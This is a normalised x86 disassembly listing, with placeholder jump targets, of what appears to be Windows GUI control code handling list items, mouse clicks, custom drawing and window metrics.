cmp [ ebx + 0x244 ] 0x0
je r-xdata
jmp r-xdata
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_43b1b0
mov esi eax
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_4062cc
lea edx [ esp + 0x8 ]
mov cl 0x4
mov eax ebx
call sub_43b50c
mov esi eax
jmp r-xdata
mov eax esi
call sub_437b38
push eax
mov eax [ ebx + 0x22c ]
call sub_437cc0
mov edi eax
dec edi
pop eax
sub edi eax
jl r-xdata
test esi esi
je r-xdata
inc edi
mov esi eax
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
xor ecx ecx
mov edx 0x1
call sub_43784c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov edx 0x1
call sub_4377e4
test al al
je r-xdata
sub_43b08c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ ebp + 0xc ]
call sub_43b574
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_43b3b0
mov edi eax
cmp edi ebx
jne r-xdata
xor eax eax
mov [ esi + 0x270 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
test edi edi
je r-xdata
cmp ebx [ esi + 0x270 ]
jne r-xdata
mov cl [ ebp + 0x8 ]
mov edx 0x1
mov eax ebx
call sub_43784c
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor ecx ecx
mov edx 0x1
mov eax edi
call sub_43784c
sub_43b130
push ebx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4550b4
mov edx sub_4386a8
xor ecx ecx
call sub_42ac88
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43b160
cmp dl [ eax + 0x229 ]
je r-xdata
retn
mov [ eax + 0x229 ] dl
mov dl [ eax + 0x229 ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x2ea ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
call sub_43b130
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_43b1b0
push ebx
push esi
mov ebx eax
xor esi esi
mov al [ ebx + 0x215 ]
sub al 0x2
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4550b4
call sub_42ab64
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov esi eax
sub_43b1e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x218 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x218 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45c5c0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_438e40
mov edx [ ebx + 0x27c ]
call sub_45c604
mov edx ebx
mov eax [ ebx + 0x218 ]
call sub_421b4c
mov eax [ ebx + 0x218 ]
call sub_45bc30
mov edx eax
xor ecx ecx
mov eax ebx
call sub_438e40
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43b258
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x21c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x21c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x280 ]
call sub_45c5c0
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_438e40
mov edx [ ebx + 0x280 ]
call sub_45c604
mov edx ebx
mov eax [ ebx + 0x21c ]
call sub_421b4c
mov eax [ ebx + 0x21c ]
call sub_45bc30
mov edx eax
mov ecx 0x1
mov eax ebx
call sub_438e40
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43b2d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x220 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x220 ] esi
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_45c5c0
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov eax ebx
call sub_43942c
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_438e40
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_45c604
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_421b4c
mov eax [ ebx + 0x220 ]
call sub_45bc30
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_438e40
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
mov eax ebx
call sub_4394b0
mov dl 0x1
mov eax ebx
call sub_4394b0
mov eax ebx
call sub_4393a0
jmp r-xdata
sub_43b3b0
push ebx
mov ebx eax
mov al [ r-xdata ]
push eax
mov cl 0x4
xor edx edx
mov eax ebx
call sub_43b438
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x270 ]
sub_43b3d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_43b3b0
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x1
mov eax esi
call sub_43784c
jmp r-xdata
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_43784c
sub_43b438
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor eax eax
mov al [ ebp - 0x1 ]
cmp eax 0x4
ja r-xdata
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_43b46f ]
or edi 0xffffffff
mov eax edi
call sub_437b38
mov edi eax
jmp r-xdata
mov esi 0x100
jmp r-xdata
mov esi 0x200
jmp r-xdata
mov esi 0x400
jmp r-xdata
mov esi 0x800
jmp r-xdata
xor esi esi
test [ ebp + 0x8 ] 0x4
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
or esi 0x8
test [ ebp + 0x8 ] 0x10
je r-xdata
or esi 0x1
mov eax ebx
call sub_4550b4
mov ecx esi
mov edx edi
call sub_42a9d0
mov edi eax
cmp edi 0xffffffff
je r-xdata
or esi 0x2
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov [ ebp - 0x8 ] eax
sub_43b50c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
mov [ esp + 0x8 ] 0x40
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov eax esi
call sub_4550b4
lea ecx [ esp + 0x8 ]
or edx 0xffffffff
call sub_42a9f4
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov edx eax
mov eax [ esi + 0x22c ]
call sub_437cf0
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_43b574
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax esi
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x14 ]
mov edx ebp
mov eax edi
call sub_4062cc
mov eax [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_4550b4
mov edx esp
call sub_42aa40
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov esi eax
sub_43b5d8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4550b4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_42aa6c
pop esi
pop ebx
retn
sub_43b5f8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax [ ebx + 0x23c ]
call sub_419a38
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43b638
inc edi
dec esi
jne r-xdata
sub_43b638
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp edx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_436f90
mov edi eax
mov [ esp + 0x1 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x19 ] eax
mov eax [ edi + 0x10 ]
call sub_4045d8
mov [ esp + 0xd ] eax
mov al [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_4196d8
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x5 ] eax
mov eax ebx
mov si 0xffc8
call sub_403518
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0x5 ] eax
jmp r-xdata
and [ esp + 0x1 ] 0xffffffef
mov eax [ esp + 0x5 ]
or eax 0x800
or eax 0x8000
mov [ esp + 0x5 ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_436f90
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_4550b4
lea ecx [ esp + 0x5 ]
pop edx
call sub_42aa98
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
or [ esp + 0x1 ] 0x2
mov [ esp + 0x9 ] eax
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_436f90
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_4550b4
lea ecx [ esp + 0x5 ]
pop edx
call sub_42aa98
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x215 ] 0x3
jne r-xdata
mov eax ebx
call sub_4550b4
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_42aaf4
jmp r-xdata
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_436f90
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_4550b4
mov ecx [ edi + 0x24 ]
pop edx
call sub_42aaf4
sub_43b788
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ax [ edi + 0x4 ]
call sub_46567c
mov ebx eax
mov [ esi + 0x230 ] 0x0
mov [ esi + 0x26c ] 0xffffffff
mov edx edi
mov eax esi
call sub_44ff50
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
je r-xdata
cmp [ esi + 0x228 ] 0x0
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax esi
call sub_44e3f8
lea eax [ esp + 0xc ]
call sub_406e64
mov [ esp + 0x8 ] eax
mov eax esi
call sub_44f03c
test al al
jne r-xdata
test bl 0x1
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x228 ] 0x0
je r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406de0
push eax
push 0x0
push 0x202
call GetCapture
push eax
call SendMessageA
jmp r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406de0
push eax
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44fa80
mov [ esi + 0x230 ] 0x0
jmp r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_43b574
mov ebp eax
test ebp ebp
je r-xdata
test bl 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov edx 0x3
mov eax ebp
call sub_4377e4
test al al
je r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_43b574
mov ebp eax
test ebp ebp
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44ef74
mov edx 0x3
mov eax ebp
call sub_4377e4
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44ef74
jmp r-xdata
sub_43b8ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_43ba70
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44e2b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a38
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ba77
mov eax [ ebp - 0x14 ]
call sub_40331c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_43ba53
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax esi
call sub_436db8
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_418b9c
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418cf8
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx ebx
call sub_436f90
mov esi eax
cmp [ esi + 0xd ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418cf8
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_436dec
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax esi
call sub_436db8
cmp edi eax
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418be8
mov eax esi
call sub_436db8
sub [ ebp - 0xc ] eax
sub_43ba80
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_453590
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
call sub_43b8ec
sub_43bab4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov bx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425720
xor eax eax
push ebp
push sub_43bbcd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425b4c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4259ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425a08
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437cf0
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425670
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bbd4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425b4c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4259c4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_43bbec
test cl cl
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
setne al
jmp r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
retn
cmp [ eax + 0x2f2 ] 0x0
jne r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_43bcf4
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2aa ] 0x0
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x2ac ]
call [ esi + 0x2a8 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
sub_43bd4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2b2 ] 0x0
je r-xdata
cmp [ esi + 0x2fa ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov ax [ ebp - 0x6 ]
push eax
push ebx
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2b4 ]
call [ esi + 0x2b0 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
sub_43bdbc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2ba ] 0x0
je r-xdata
cmp [ esi + 0x302 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
push ebx
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2bc ]
call [ esi + 0x2b8 ]
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
sub_43be34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_44d4a8
cmp [ ebx + 0x332 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x210 ]
call sub_425670
mov eax [ esi + 0x24 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x210 ]
call sub_42585c
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43beac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x352 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x354 ]
call [ ebx + 0x350 ]
sub_43bef0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43c047
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x210 ]
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4253e8
mov eax [ ebx + 0x290 ]
call sub_419a38
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c04e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40413c
retn
inc eax
mov [ ebp - 0xc ] eax
xor edi edi
inc edi
dec [ ebp - 0xc ]
jne r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_4250c8
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_43722c
mov edx [ eax + 0x20 ]
mov eax [ esi + 0xc ]
call sub_424b00
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_43722c
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_42585c
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_43722c
mov edx [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
call sub_424fec
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_4250c8
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43b198
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43b198
mov eax [ ebp - 0x20 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_43722c
push esi
push edi
lea esi [ eax + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4062d4
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4257ac
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_43722c
lea edx [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_43c058
push ebx
mov ebx eax
mov eax ebx
call sub_453244
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
pop ebx
retn
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_43bef0
sub_43c08c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c1a5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x35a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450c18
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_43b574
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c1ac
lea eax [ ebp - 0x8 ]
call sub_404118
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
call sub_4041b0
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10c ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_437b54
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44e3cc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_44e3cc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push edi
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax 0x38
mov edx [ ebp - 0x8 ]
call sub_40416c
push 0xe
call GetSystemMetrics
add eax [ edi + 0x1c ]
mov [ edi + 0xc ] eax
push 0xd
call GetSystemMetrics
add eax [ edi + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44e2b8
